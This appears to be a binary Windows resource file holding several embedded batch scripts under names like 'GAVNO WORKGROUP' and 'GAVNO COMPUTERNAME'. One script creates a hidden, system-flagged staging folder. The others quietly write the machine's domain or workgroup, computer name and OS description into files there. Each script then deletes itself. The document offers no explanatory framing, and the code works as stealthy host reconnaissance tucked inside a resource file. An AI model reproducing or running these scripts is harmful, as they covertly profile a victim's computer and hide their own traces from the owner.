        ��  ��                  T   4   G A V N O   M D _ P A T H       0         @echo off
if not exist "temp_s\" (
md temp_s\
)
attrib temp_s +S +H
del %~s0 /q�   8   G A V N O   W O R K G R O U P       0         @echo off
(for /f "skip=1 delims=" %%i in ('wmic computersystem get domain') do (
echo %%i))>temp_s\WORKGROUP.txt
del %~s0 /qC   @   G A V N O   C O M P U T E R N A M E         0         @echo off
echo %COMPUTERNAME%>temp_s\COMPUTERNAME.txt
del %~s0 /q �   4   G A V N O   C O M M E N T       0         @echo off
for /f "tokens=2 delims==" %%d in ('wmic os get Description /value') do set servercomment=%%d
echo %servercomment%>temp_s\COMMENT.txt
del %~s0 /q  